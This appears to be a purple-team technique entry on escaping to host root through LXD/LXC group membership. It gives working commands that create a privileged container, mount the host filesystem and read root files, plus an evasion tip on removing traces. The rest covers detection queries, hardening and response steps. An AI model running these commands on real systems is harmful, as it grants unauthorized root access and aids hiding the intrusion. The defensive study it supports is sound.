examples.label: Import Alpine image (offline, from transferred tar)
examples.command: lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

examples.label: Full LXD escape - privileged container mounting host /
examples.command:
lxc delete privesc --force 2>/dev/null
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc -- cat /mnt/root/root/flag.txt

notes: lxd/lxc membership lets you launch a privileged container with host / mounted at /mnt/root, then read or write any host file as root. Import a small image (Alpine) if none is present.
name: Privileged Groups - LXD/LXC Container Escape
description: Members of the lxd/lxc group can launch a privileged container with the host filesystem mounted, giving root-level read/write of the host - a full root escape.

steps.label: 1. Import an image
steps.command:
unzip alpine.zip; cd 64-bit\ Alpine/
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
# or: lxc image import ubuntu-template.tar.xz --alias ubuntutemp

steps.label: 2. Create privileged container + mount host /
steps.command:
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

steps.label: 3. Start, exec, read host root
steps.command:
lxc start r00t
lxc exec r00t /bin/sh
cd /mnt/root/root

defense.why_it_works: Members of the 'lxd' group can manage LXD containers. By importing an Alpine image and creating a privileged container (security.privileged=true) with the host filesystem mounted (source=/ path=/mnt/root), a member of the lxd group gains root-equivalent access to the entire host filesystem from within the container.
defense.prerequisites: Attacker's user is a member of the 'lxd' or 'lxc' group. LXD daemon running. An importable container image (Alpine) available.
defense.impact: Full root-level read/write access to the host filesystem via a privileged LXD container. Can read /etc/shadow, SSH keys, install backdoors, and achieve persistent root access.
defense.detection: lxc init with security.privileged=true by lxd-group member. Container configuration with host root mount. LXD audit log: privileged container creation. EDR: access to /mnt/root/root from container process.
defense.artifacts: LXD daemon log (privileged container created) | Auditd: lxc exec to access host filesystem | File access log: reads to /mnt/root/root/
defense.splunk_spl:
index=linux sourcetype="linux:auditd" comm="lxc" proctitle="*security.privileged=true*"
| table _time, host, auid, proctitle
defense.sentinel_kql:
Syslog
| where SyslogMessage has "lxc" and SyslogMessage has_any ("security.privileged=true","disk source=/")
| project TimeGenerated, Computer, SyslogMessage
| sort by TimeGenerated desc
// lxd-group member creating a privileged container with a host root device
defense.prevention: Remove unnecessary users from lxd/lxc group. Treat lxd group membership as equivalent to root. Enforce LXD profile restrictions (disallow security.privileged=true). Apply AppArmor LXD profile.
defense.misconfiguration: Regular user in 'lxd' group. LXD daemon allows creation of privileged containers with host filesystem mounts without additional authorization.
defense.vulnerable_config:
# User in lxd group
id
# uid=1000(htb-student) groups=...,116(lxd)

# Trivial host escape:
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
defense.secure_config:
# Remove from lxd group
gpasswd -d htb-student lxd

# LXD profile: disallow privileged containers
lxc profile create restricted
lxc profile set restricted security.privileged false
lxc profile set restricted security.nesting false

# Apply to all containers by default
defense.evasion: Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Linux Audit (auditd), Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

variations.label: Import a prebuilt alpine image
variations.command: lxc image import alpine.tar.gz alpine.tar.gz.root --alias r00t

explain:
Escapes to host root via lxd/lxc group by launching a privileged container:
  lxc init <image> r00t    create a container named r00t from an imported image
  -c security.privileged=true   run it privileged (no UID remapping)
Then lxc config device add mounts the host / into it, and lxc exec drops you into a shell with root read/write of the host filesystem under /mnt/root.
